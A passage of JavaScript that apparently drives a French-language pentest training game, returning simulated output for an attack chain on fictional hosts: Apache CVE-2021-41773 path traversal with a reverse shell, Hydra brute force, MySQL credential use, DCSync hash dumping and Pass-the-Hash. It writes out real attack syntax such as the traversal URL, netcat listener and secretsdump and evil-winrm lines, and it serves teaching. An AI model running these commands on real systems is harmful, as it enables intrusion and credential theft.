
    if (!ip || !hasExploit) {
      return {
        output: [
          'Usage: python3 <exploit_script> <ip> <port>',
          'Exemple: python3 cve-2021-41773.py 192.168.1.10 4444',
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const machine = getMachineByIP(ip);
    if (!machine || machine.id !== 'webserver') {
      return { output: `\x1b[31m[!] Aucun exploit disponible pour ${ip}.\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes('webserver')) {
      return { output: '\x1b[31m[!] Scanne d\'abord l\'Active Directory : nmap -sV 192.168.1.10\x1b[0m', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    const port = args.find(a => /^\d{4,5}$/.test(a)) || state.listenerPort || 4444;
    const listenerNote = state.listenerPort
      ? `\x1b[32m[+] Connexion entrante sur listener :${state.listenerPort} ✓\x1b[0m`
      : '\x1b[33m[!] Aucun listener nc détecté. En réel : lance nc -lvnp 4444 d\'abord.\x1b[0m    (simulation : reverse shell déclenché quand même)\x1b[0m';

    const webMachine = MACHINES.find(m => m.id === 'webserver');
    return enterMachine(webMachine, [
      `\x1b[36m[*] Envoi du payload CVE-2021-41773 vers ${ip}:80...\x1b[0m`,
      `\x1b[36m[*] GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh\x1b[0m`,
      `\x1b[36m[*] POST data: echo;id\x1b[0m`,
      '',
      `\x1b[32m[+] RCE confirmée ! uid=33(www-data) gid=33(www-data)\x1b[0m`,
      listenerNote,
      `\x1b[32m[+] REVERSE SHELL ÉTABLI → 10.0.0.1:${port}\x1b[0m`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  🏢 SHELL — Active Directory (${ip})        ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS       : Ubuntu 20.04 / Apache 2.4.49`,
      `  User     : www-data (uid=33)`,
      `  Listener : 10.0.0.1:${port}`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / id / uname -a / ls -la / cat /etc/os-release',
      '',
      '\x1b[35mORACLE > Reverse shell actif. Tape : id  pour vérifier le contexte.\x1b[0m',
    ],
    'CVE-2021-41773 : Path Traversal sur Apache 2.4.49 qui permet de traverser les répertoires hors du DocumentRoot et, quand mod_cgi est actif, d\'exécuter du code. Le reverse shell connecte la victime vers l\'attaquant — les firewalls laissent passer les connexions sortantes.',
    25, state);
  }

  // ── hydra : brute-force SSH / RDP ──
  if (cmd === 'hydra') {
    const rawIpArg = args.find(a => /192\.168\.1\.\d+/.test(a)) || '';
    const ip = rawIpArg.replace(/^[a-z]+:\/\//, '').split(':')[0];
    const isRdp = args.some(a => /rdp:\/\//i.test(a)) || args.includes('rdp');
    if (!ip) return { output: 'Usage: hydra -l <user> -P <wordlist> <ip> ssh\n       hydra -l <user> -P <wordlist> rdp://<ip> -t 4', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `hydra: ${ip} — hôte inaccessible.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mhydra: ${ip} — connexion refusée (réseau interne).\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if ((machine.id === 'webserver' || machine.id === 'dc') && isRdp) {
      return {
        output: [
          `\x1b[36mHydra v9.4 starting — brute-force RDP on ${ip}:3389\x1b[0m`,
          `[DATA] max 4 tasks per 1 server, overall 4 tasks`,
          `[DATA] attacking rdp://${ip}:3389/`,
          `[STATUS] 1024 of 14344399 tries completed, 0% done`,
          `[STATUS] 10240 of 14344399 tries completed, 0% done`,
          `[STATUS] 102400 of 14344399 tries completed, 0% done`,
          `[STATUS] 1024000 of 14344399 tries completed, 7% done`,
          '',
          `\x1b[31m[ERROR] 1 target did not complete — 0 valid password found.\x1b[0m`,
          `\x1b[31m[!] administrator — mot de passe absent de rockyou.txt\x1b[0m`,
          '',
          `\x1b[33m📚 Pourquoi ça échoue sur un DC :\x1b[0m`,
          `   Les admins AD utilisent des mots de passe complexes hors des wordlists courantes`,
          `   RDP brute-force = 4 threads max (NLA) + logs Windows Event 4625 générés`,
          `   → Visible, lent, et souvent bloqué par les politiques de lockout`,
          '',
          `\x1b[32m📚 Pourquoi Kerberoasting est préféré :\x1b[0m`,
          `   Offline (hash cracké localement, aucune connexion vers le DC)`,
          `   Discret (aucun log d\'authentification généré)`,
          `   Sans lockout (demande de TGS légitime)`,
          '',
          `\x1b[33m💡 Prochaine étape :\x1b[0m`,
          `   \x1b[36mkerbrute userenum --dc ${ip} -d corp.local userlist.txt\x1b[0m`,
        ].join('\n'),
        pedagogie: 'Hydra RDP brute-force échoue sur un DC car : (1) les mots de passe admin sont complexes et absents des wordlists, (2) NLA (Network Level Authentication) limite les threads, (3) chaque échec génère un event 4625 (Account Logon Failure) détectable par les SIEM. Kerberoasting préféré : offline, discret, sans lockout.',
        effect: null, xpBonus: 10, stateChanges: {}
      };
    }

    if (machine.id === 'mailserver') {
      return {
        output: [
          `\x1b[36mHydra v9.4 starting — brute-force SSH on ${ip}\x1b[0m`,
          '[DATA] max 16 tasks per 1 server',
          '[DATA] attacking ssh://192.168.1.20:22/',
          '[STATUS] attack finished for 192.168.1.20 (valid pair found at position 237)',
          '',
          `\x1b[32m[22][ssh] host: ${ip}   login: admin   password: letmein\x1b[0m`,
          '',
          '1 of 1 target successfully completed, 1 valid password found',
          '',
          '\x1b[33m💡 Credentials SSH trouvés ! Connecte-toi :\x1b[0m',
          `\x1b[36m   ssh admin@${ip}\x1b[0m`,
        ].join('\n'),
        pedagogie: 'Hydra est un cracker de mots de passe réseau multi-protocoles. -l = login unique, -L = liste de logins, -p = mot de passe unique, -P = wordlist. rockyou.txt (14M mots de passe) est la référence. fail2ban ou un rate-limit SSH bloque cette attaque en production.',
        effect: null, xpBonus: 30,
        stateChanges: { hydraDone: true }
      };
    }

    return {
      output: [
        `\x1b[31mHydra: aucun résultat sur ${machine.ip} — fail2ban actif ou politique de compte trop stricte.\x1b[0m`,
        'Essaie une autre approche pour cette machine.',
      ].join('\n'),
      pedagogie: 'fail2ban bloque les IPs après N tentatives échouées. Alternatives : credential stuffing, password spraying (1 mot de passe pour N comptes), ou exploitation de vulnérabilités applicatives.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  // ── ssh user@ip ──
  if (cmd === 'ssh') {
    const atTarget = args.find(a => a.includes('@'));
    let user = null, ip = null;
    if (atTarget) {
      const parts = atTarget.split('@');
      user = parts[0]; ip = parts[1];
    } else {
      const lIdx = args.indexOf('-l');
      if (lIdx !== -1) user = args[lIdx + 1];
      ip = args.find(a => /192\.168\.1\.\d+/.test(a));
    }

    if (!ip) return { output: 'Usage: ssh user@<ip>   ou   ssh -l user <ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `ssh: connect to host ${ip} port 22: No route to host`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mssh: connect to host ${ip} port 22: Connection refused\x1b[0m\nRéseau interne inaccessible depuis ta position.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Machine non scannée. Lance d\'abord : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'mailserver') {
      if (!state.hydraDone && !state.pwnedMachines.includes('mailserver')) {
        return {
          output: [
            `\x1b[31m${user || 'admin'}@${ip}: Permission denied (publickey,password).\x1b[0m`,
            '',
            '\x1b[33m💡 Mot de passe inconnu. Brute-force d\'abord :\x1b[0m',
            `\x1b[36m   hydra -l admin -P /usr/share/wordlists/rockyou.txt ${ip} ssh\x1b[0m`,
          ].join('\n'),
          pedagogie: 'SSH rejette les connexions sans le bon mot de passe. Le brute-force avec Hydra est la méthode quand aucune autre vulnérabilité n\'est exploitable sur SSH directement.',
          effect: null, xpBonus: 0, stateChanges: {}
        };
      }

      const mailMachine = MACHINES.find(m => m.id === 'mailserver');
      return enterMachine(mailMachine, [
        `The authenticity of host '${ip}' can't be established.`,
        `RSA key fingerprint is SHA256:xK9mN2p4Y7qR3sT8vW1uX6oZ5bA2cE0dF.`,
        'Are you sure you want to continue connecting (yes/no/[fingerprint])? yes',
        `Warning: Permanently added '${ip}' (RSA) to the list of known hosts.`,
        `admin@${ip}'s password: `,
        '',
        '\x1b[32mLinux mail-server 5.10.0-19-amd64 #1 SMP Debian 5.10.149\x1b[0m',
        '',
        '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
        `\x1b[32m║  📧 SSH SHELL — Mail Server (${ip})         ║\x1b[0m`,
        '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
        '',
        `  OS   : Debian 11 / Postfix 3.5.6`,
        `  User : admin@mail-server`,
        '',
        '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
        '  recon / id / uname -a / cat /etc/postfix/main.cf',
        '',
        '\x1b[35mORACLE > Connexion SSH établie. Fouille le serveur mail.\x1b[0m',
      ],
      'SSH (Secure Shell) donne un shell interactif chiffré sur la machine distante. Après brute-force des credentials, on obtient un accès complet au niveau de privilège de l\'utilisateur compromis.',
      20, state);
    }

    if (!machine.services.some(s => s.startsWith('SSH'))) {
      return { output: `\x1b[31mssh: connect to host ${ip} port 22: Connection refused\x1b[0m\n${machine.name} n\'accepte pas SSH. Utilise la bonne méthode.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    return { output: `\x1b[31m${user || 'root'}@${ip}: Permission denied (publickey,password).\x1b[0m\nTrouve d\'abord les credentials pour cette machine.`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── mysql : connexion au DB Server ──
  if (cmd === 'mysql') {
    const hIdx = args.indexOf('-h');
    const ip = hIdx !== -1 ? args[hIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip) return { output: 'Usage: mysql -h <ip> -u <user> -p<password>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine || machine.id !== 'dbserver') {
      return { output: `mysql: Can't connect to MySQL server on '${ip}': Connection refused`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state)) {
      return {
        output: `\x1b[31mmysql: Can't connect to MySQL server on '${ip}' (111): Connection refused\x1b[0m\nRéseau interne inaccessible. Compromets d\'abord l\'Active Directory ou le Mail Server.`,
        pedagogie: 'MySQL (3306) est généralement sur un réseau interne non routable. Pour y accéder : tunnel SSH (ssh -L 3306:192.168.1.30:3306 admin@pivot), proxy SOCKS5, ou chisel.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!hasDBCreds(state)) {
      return {
        output: [
          `\x1b[31mERROR 1045 (28000): Access denied for user 'root'@'10.0.0.1' (using password: NO)\x1b[0m`,
          '',
          '\x1b[33m💡 Credentials MySQL non encore découverts.\x1b[0m',
          '   Compromets d\'abord l\'Active Directory ou le Mail Server — les credentials DB',
          '   apparaissent dans les fichiers de config et emails internes.',
        ].join('\n'),
        pedagogie: 'Les credentials de BDD se trouvent dans les fichiers de config des applis web (wp-config.php, .env, application.yml, config.php) ou dans des emails/documents internes.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const uIdx = args.indexOf('-u');
    const user = uIdx !== -1 ? args[uIdx + 1] : '';
    const passArg = args.find(a => a.startsWith('-p') && a.length > 2);
    const pass = passArg ? passArg.slice(2) : '';

    if (user !== 'db_user' || pass !== 'Str0ngP@ss') {
      return {
        output: `\x1b[31mERROR 1045 (28000): Access denied for user '${user || '?'}'@'10.0.0.1' (using password: ${pass ? 'YES' : 'NO'})\x1b[0m\n\x1b[33m💡 Credentials trouvés lors de l\'exploitation précédente : db_user / Str0ngP@ss\x1b[0m`,
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const dbMachine = MACHINES.find(m => m.id === 'dbserver');
    return enterMachine(dbMachine, [
      `Welcome to the MySQL monitor.  Commands end with ; or \\g.`,
      `Your MySQL connection id is 42`,
      `Server version: 5.7.38-log MySQL Community Server (GPL)`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  🗄  MySQL SHELL — DB Server (${ip})         ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS      : CentOS 7 / MySQL 5.7.38`,
      `  User    : db_user@db-server`,
      `  FILE    : ACTIVÉ (lecture/écriture de fichiers système)`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / show databases; / show tables; / select version();',
      '',
      '\x1b[35mORACLE > MySQL connecté. Explore les bases de données.\x1b[0m',
    ],
    'Connexion MySQL distante avec credentials découverts lors de la phase précédente. Le privilege FILE permet via SELECT LOAD_FILE() de lire des fichiers système arbitraires, ou via SELECT INTO OUTFILE d\'écrire des webshells.',
    20, state);
  }

  // ── evil-winrm : accès au Domain Controller ──
  if (cmd === 'evil-winrm') {
    const iIdx = args.indexOf('-i');
    const ip = iIdx !== -1 ? args[iIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a));

    if (!ip) return { output: 'Usage: evil-winrm -i <ip> -u <user> -H <ntlm_hash>\nOu: evil-winrm -i <ip> -u <user> -p <password>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    // Résoudre la machine cible — accepter .10 (webserver/AD) ou .100 (dc) selon le contexte
    let machine = getMachineByIP(ip);
    const dcMachineObj = MACHINES.find(m => m.id === 'dc');

    // Si la cible est .10 (webserver) ET que ntdsDumped → on cible en réalité le DC
    if (machine && machine.id === 'webserver' && state.ntdsDumped) {
      machine = dcMachineObj;
    }

    if (!machine || machine.id !== 'dc') {
      return { output: `evil-winrm: Connection failed to ${ip} (WinRM port 5985 fermé ou machine inconnue)`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (isLocked(machine, state) && !state.ntdsDumped) {
      return {
        output: [
          `\x1b[31mevil-winrm: Connection refused — ${ip} inaccessible.\x1b[0m`,
          '',
          `\x1b[33m💡 Effectue d'abord le DCSync pour obtenir les hashes :\x1b[0m`,
          `   \x1b[36mimpacket-secretsdump corp.local/svc_backup:ManagementPassword123@192.168.1.10\x1b[0m`,
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    if (!hasDCHash(state)) {
      return {
        output: [
          `\x1b[31mevil-winrm: Connection failed — hash NTLM requis.\x1b[0m`,
          '',
          '\x1b[33m💡 Extrais d\'abord les hashes via DCSync :\x1b[0m',
          '   \x1b[36mimpacket-secretsdump corp.local/svc_backup:ManagementPassword123@192.168.1.10\x1b[0m',
        ].join('\n'),
        pedagogie: 'Les hashes NTLM s\'extraient depuis NTDS.dit (DC) via DCSync (secretsdump), depuis la SAM (postes locaux), ou via mimikatz/lsass dump.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const uIdx = args.indexOf('-u');
    const user = uIdx !== -1 ? args[uIdx + 1] : 'Administrator';
    const hIdx = args.indexOf('-H');
    const hash = hIdx !== -1 ? args[hIdx + 1] : '<hash>';

    const dcMachine = MACHINES.find(m => m.id === 'dc');
    return enterMachine(dcMachine, [
      '\x1b[32mInfo: Establishing connection to remote endpoint\x1b[0m',
      `\x1b[32m*Evil-WinRM* PS C:\\Users\\${user}\\Documents>\x1b[0m`,
      '',
      '\x1b[32m╔══════════════════════════════════════════════════╗\x1b[0m',
      `\x1b[32m║  👑 WinRM SHELL — Domain Controller (${ip}) ║\x1b[0m`,
      '\x1b[32m╚══════════════════════════════════════════════════╝\x1b[0m',
      '',
      `  OS      : Windows Server 2019 (Build 17763)`,
      `  Domain  : CORP.LOCAL`,
      `  User    : ${user} (Pass-the-Hash)`,
      `  Hash    : ${hash.substring(0, 16)}...`,
      '',
      '\x1b[33m━━━ PHASE 1 : RECONNAISSANCE ━━━━━━━━━━━━━━━━━━━━━\x1b[0m',
      '  recon / whoami /all / net user /domain / hostname',
      '',
      '\x1b[35mORACLE > Tu es sur le DC. La fin est proche.\x1b[0m',
    ],
    'Evil-WinRM exploite le service WinRM (port 5985/5986) pour obtenir un shell PowerShell. Le Pass-the-Hash (PtH) permet de s\'authentifier avec un hash NTLM sans connaître le mot de passe en clair — Windows accepte le hash directement dans le protocole NTLM.',
    30, state);
  }

  // ── impacket-secretsdump : DCSync — dump NTDS.dit (mode réseau) ──
  if (cmd === 'impacket-secretsdump' || cmd === 'secretsdump') {
    // Extraire l'IP cible depuis --dc-ip ou @IP
    const dcIpIdx = args.indexOf('-dc-ip');
    const dcIp = dcIpIdx !== -1 ? args[dcIpIdx + 1] : null;
    const atArg = args.find(a => /@192\.168\.1\.\d+/.test(a));
    const targetIp = dcIp || (atArg ? atArg.split('@').pop() : null) || '192.168.1.10';

    const machine = getMachineByIP(targetIp);

    if (!state.smbShareAccessed && !state.pwnedMachines.includes('dbserver')) {
      return {
        output: [
          `\x1b[31m[-] impacket-secretsdump : Access Denied\x1b[0m`,
          '',
          `\x1b[33m💡 Tu n'as pas encore les droits DCSync.\x1b[0m`,
          `   Obtiens les credentials svc_backup (AS-REP Roasting) puis accède au partage backup :`,
          `   \x1b[36msmbclient //192.168.1.10/backup -U corp/svc_backup%ManagementPassword123\x1b[0m`,
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    if (state.ntdsDumped) {
      return {
        output: `\x1b[33m[Déjà fait]\x1b[0m NTDS.dit déjà dumpé. Lance :\n\x1b[36mevil-winrm -i 192.168.1.100 -u Administrator -H 5f4dcc3b5aa765d61d8327deb882cf99\x1b[0m`,
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    return {
      output: [
        `\x1b[36mImpacket v0.12.0 — secretsdump (DCSync)\x1b[0m`,
        `[*] Target   : ${targetIp}`,
        `[*] Account  : corp\\svc_backup (Replicating Directory Changes)`,
        '',
        `\x1b[33m[*] Requesting shares on ${targetIp}.....\x1b[0m`,
        `[*] Found writable share ADMIN$`,
        `[*] Uploading file xCfqrtML.exe`,
        `\x1b[33m[*] Opening SVCManager on ${targetIp}.....\x1b[0m`,
        `[*] Creating service RmSX on ${targetIp}.....\x1b[0m`,
        `[*] Starting service RmSX.....\x1b[0m`,
        '',
        `\x1b[32m[+] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\x1b[0m`,
        `[*] Using the DRSUAPI method to get NTDS.DIT secrets`,
        '',
        `\x1b[31mAdministrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::\x1b[0m`,
        `Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`,
        `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::`,
        `svc_backup:1103:aad3b435b51404eeaad3b435b51404ee:7e3a2cf6e75d2e3e7fb2fe4b0c3cf892:::`,
        `john.doe:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::`,
        `jane.smith:1105:aad3b435b51404eeaad3b435b51404ee:b7a875fc1ea228b9befbf5e7bd3cdf7c:::`,
        '',
        `\x1b[32m[+] Kerberos keys grabbed:\x1b[0m`,
        `krbtgt:aes256-cts-hmac-sha1-96:a2e9ade7d7e6b22c6f8e8c4a2b1d3f5e...`,
        `Administrator:aes256-cts-hmac-sha1-96:e3f8b2d1c4a5f6e7b8c9d0e1f2a3b4c5...`,
        '',
        `\x1b[32m[*] Cleaning up...\x1b[0m`,
        '',
        `\x1b[31m╔══════════════════════════════════════════════════════╗\x1b[0m`,
        `\x1b[31m║  DCSync RÉUSSI — NTDS.dit entièrement dumpé          ║\x1b[0m`,
        `\x1b[31m║  Hash Administrator : 5f4dcc3b5aa765d61d8327deb882cf99 ║\x1b[0m`,
        `\x1b[31m║  Hash krbtgt       : 819af826bb148e603acb0f33d17632f8  ║\x1b[0m`,
        `\x1b[31m║  → Golden Ticket possible (persistance 10 ans)        ║\x1b[0m`,
        `\x1b[31m╚══════════════════════════════════════════════════════╝\x1b[0m`,
        '',
        `\x1b[33m💡 Prochaine étape — Pass-the-Hash vers le DC :\x1b[0m`,
        `   \x1b[36mevil-winrm -i 192.168.1.100 -u Administrator -H 5f4dcc3b5aa765d61d8327deb882cf99\x1b[0m`,
      ].join('\n'),
      pedagogie: 'DCSync : technique qui exploite le protocole de réplication AD (MS-DRSR). Le compte svc_backup a "Replicating Directory Changes" → il peut demander au DC de lui répliquer les hashes NTLM comme si c\'était un autre DC. secretsdump extrait NTDS.dit (base de données AD) → tous les hashes du domaine. Le hash krbtgt permet de forger des Golden Tickets (validité 10 ans, sans connexion DC).',
      effect: null, xpBonus: 50,
      stateChanges: {
        ntdsDumped: true,
        unlockedMachines: [...new Set([...(state.unlockedMachines || []), 'dc'])]
      }
    };
  }

  // ── impacket / psexec ──
  if (cmd === 'psexec.py' || cmd === 'secretsdump.py' || cmd === 'impacket') {
    return {
      output: '\x1b[33m💡 Bonne direction ! Utilise evil-winrm pour te connecter au DC :\x1b[0m\n\x1b[36m   evil-winrm -i 192.168.1.100 -u Administrator -H <ntlm_hash>\x1b[0m',
      pedagogie: 'La suite Impacket offre psexec.py, wmiexec.py, secretsdump.py, GetUserSPNs.py et bien d\'autres. Ici evil-winrm est l\'outil modélisé pour la connexion WinRM.',
      effect: null, xpBonus: 5, stateChanges: {}
    };
  }

  // ── cd → erreur éducative ──
  if (cmd === 'cd') {
    const target = args[0];
    if (!target) return { output: 'bash: cd: argument manquant', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(target) || getMachineByIdOrName(target);
    if (machine) {
      const hints = {
        webserver:  `nc -lvnp 4444  puis  python3 cve-2021-41773.py ${machine.ip} 4444`,
        mailserver: `hydra -l admin -P rockyou.txt ${machine.ip} ssh  puis  ssh admin@${machine.ip}`,
        dbserver:   `mysql -h ${machine.ip} -u db_user -pStr0ngP@ss`,
        dc:         `evil-winrm -i ${machine.ip} -u Administrator -H <ntlm_hash>`,
      };
      return {
        output: [
          `\x1b[31mbash: cd: ${target}: Not a directory\x1b[0m`,
          '',
          '\x1b[33m💡 "cd" navigue dans des répertoires locaux — impossible de "cd" vers une IP.\x1b[0m',
          `   Pour accéder à ${machine.name}, utilise :`,
          `\x1b[36m   ${hints[machine.id] || `connect ${machine.ip}`}\x1b[0m`,
        ].join('\n'),
        pedagogie: 'En pentest : ssh/scp pour Linux, evil-winrm/psexec pour Windows, mysql/psql pour les BDD, et un exploit pour l\'accès initial. "cd" est uniquement pour la navigation locale du filesystem.',
        effect: null, xpBonus: 0, stateChanges: {}
      };
    }
    return { output: `bash: cd: ${target}: No such file or directory`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
  }

  // ── nikto : scanner de vulnérabilités web ──
  if (cmd === 'nikto') {
    const hIdx = args.indexOf('-h');
    const rawTarget = hIdx !== -1 ? args[hIdx + 1] : args.find(a => /192\.168\.1\.\d+/.test(a));
    const ip = rawTarget ? rawTarget.replace(/^https?:\/\//, '').split('/')[0].split(':')[0] : null;

    if (!ip) return { output: 'Usage: nikto -h <ip>   ou   nikto -h http://<ip>', pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };

    const machine = getMachineByIP(ip);
    if (!machine) return { output: `nikto: impossible de joindre ${ip}`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    if (isLocked(machine, state)) {
      return { output: `\x1b[31mnikto: ${ip} — connexion refusée (réseau interne inaccessible)\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }
    if (!state.scannedMachines.includes(machine.id)) {
      return { output: `\x1b[31m[!] Scanne d\'abord les ports ouverts : nmap -sV ${ip}\x1b[0m`, pedagogie: null, effect: null, xpBonus: 0, stateChanges: {} };
    }

    if (machine.id === 'webserver') {
      return {
        output: [
          `- Nikto v2.1.6`,
          `- Target IP:          ${ip}`,
          `- Target Hostname:    dc.corp.local`,
          `- Target Port:        80`,
          `- Start Time:         2031-01-15 09:14:02`,
          '',
          `\x1b[32m+ Server: Microsoft-IIS/10.0\x1b[0m`,
          `+ X-Powered-By: ASP.NET`,
          `+ Retrieved x-aspnet-version header: 4.0.30319`,
          `\x1b[31m+ OSVDB-877: HTTP TRACE method is active — Cross-Site Tracing (XST) possible\x1b[0m`,
          `\x1b[31m+ No X-Frame-Options header found — clickjacking possible\x1b[0m`,
          `\x1b[31m+ No X-Content-Type-Options header\x1b[0m`,
          `\x1b[31m+ No Content-Security-Policy header\x1b[0m`,
          `\x1b[33m+ /iisstart.htm: IIS 10.0 default page found\x1b[0m`,
          `\x1b[33m+ /aspnet_client/: ASP.NET client-side scripts (could contain interesting info)\x1b[0m`,
          `\x1b[33m+ /backup/: Directory accessible without authentication\x1b[0m`,
          `\x1b[31m+ /backup/passwords.txt: Sensitive file exposed!\x1b[0m`,
          `+ /admin/: HTTP 401 (authentication required)`,
          '',
          `+ 8 item(s) reported on remote host`,
          '',
          `\x1b[32m[+] IIS 10.0 identifié sur dc.corp.local → Windows Server 2019\x1b[0m`,
          `\x1b[31m[!] /backup/ accessible → fichiers sensibles exposés !\x1b[0m`,
          '',
          `\x1b[33m💡 Prochaines étapes :\x1b[0m`,
          `   \x1b[36mgobuster dir -u http://${ip} -w common.txt -x asp,aspx,txt\x1b[0m`,
          `   \x1b[36menum4linux -a ${ip}\x1b[0m → énumération SMB/RPC`,
        ].join('\n'),
        pedagogie: 'nikto est un scanner web open-source qui teste +6700 vulnérabilités. Sur IIS (Windows), il fingerprinte la version, détecte les headers de sécurité manquants (X-Frame-Options, CSP), et identifie les répertoires/fichiers sensibles. TRACE activé = XST (Cross-Site Tracing), attaque permettant de voler des cookies httpOnly via XMLHttpRequest. Très bruyant — détecté par tous les IDS/WAF.',
        effect: { type: 'SCAN_MACHINE', machineId: machine.id },
        xpBonus: 20,
        stateChanges: { scannedMachines: [...new Set([...state.scannedMachines, machine.id])] }
      };
    }

    if (machine.id === 'mailserver') {
      return {
        output: [
          `- Nikto v2.1.6 — Target: ${ip}:80`,
          '+ No web server found on port 80',
          '+ SMTP port 25 détecté — nikto ne scanne pas le protocole SMTP',
          '',
          '\x1b[33m💡 Le Mail Server n\'expose pas de service web. Utilise :\x1b[0m',
          `\x1b[36m   nmap -sV ${ip}\x1b[0m  puis  \x1b[36mhydra -l admin -P rockyou.txt ${ip} ssh\x1b[0m`,
        ].join('\n'),
        pedagogie: 'nikto cible uniquement les serveurs HTTP/HTTPS. Pour les serveurs mail (SMTP, IMAP), utilise : smtp-user-enum (énumération de comptes), swaks (test SMTP), ou hydra pour le brute-force SSH.',
        effect: null, xpBonus: 5, stateChanges: {}
      };
    }

    return {
      output: `nikto: ${machine.name} (${ip}) — pas de service web détecté sur ce port.`,
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── searchsploit ──
  if (cmd === 'searchsploit') {
    const query = joined.toLowerCase();
    if (query.includes('apache') || query.includes('41773')) {
      return {
        output: [
          '----------------------------------------------------------------------',
          ' Exploit Title                                    |  Path',
          '----------------------------------------------------------------------',
          '\x1b[32m Apache HTTP Server 2.4.49 - Path Traversal & RCE | exploits/linux/webapps/50383.py\x1b[0m',
          ' Apache HTTP Server 2.4.50 - Path Traversal & RCE | exploits/linux/webapps/50406.py',
          '----------------------------------------------------------------------',
          '',
          '\x1b[33m💡 CVE-2021-41773 confirmé ! Lance l\'exploit :\x1b[0m',
          '\x1b[36m   nc -lvnp 4444\x1b[0m',
          '\x1b[36m   python3 50383.py 192.168.1.10 4444\x1b[0m',
        ].join('\n'),
        pedagogie: 'searchsploit interroge la base Exploit-DB locale. Résultats : scripts Python/Ruby, modules Metasploit, PoC C. Toujours vérifier la version exacte avant d\'exploiter.',
        effect: null, xpBonus: 10, stateChanges: {}
      };
    }
    return {
      output: `Searching for "${joined}" in Exploit-DB...\nAucun résultat pertinent. Essaie avec le nom d\'application et la version.`,
      pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
    };
  }

  // ── dig axfr : tentative de zone transfer DNS ──
  if (cmd === 'dig') {
    const hasAxfr = args.some(a => /axfr/i.test(a));
    const domainArg = args.find(a => /\.local$/.test(a)) || 'corp.local';
    const atArg = args.find(a => a.startsWith('@'));
    const ip = atArg ? atArg.slice(1) : args.find(a => /192\.168\.1\.\d+/.test(a)) || '192.168.1.10';

    if (!hasAxfr) {
      return {
        output: [
          `Usage: dig axfr <domaine> @<ip-dc>`,
          `Exemple: dig axfr corp.local @192.168.1.10`,
        ].join('\n'),
        pedagogie: null, effect: null, xpBonus: 0, stateChanges: {}
      };
    }

    const digMachine = getMachineByIP(ip);
    if (digMachine && isLocked(digMachine, state)) {
      return {
        output: `\x1b[31m;; connection timed out; no servers could be reached\x1b[0m\n${ip} est dans un réseau interne inaccessible depuis ta position.`,
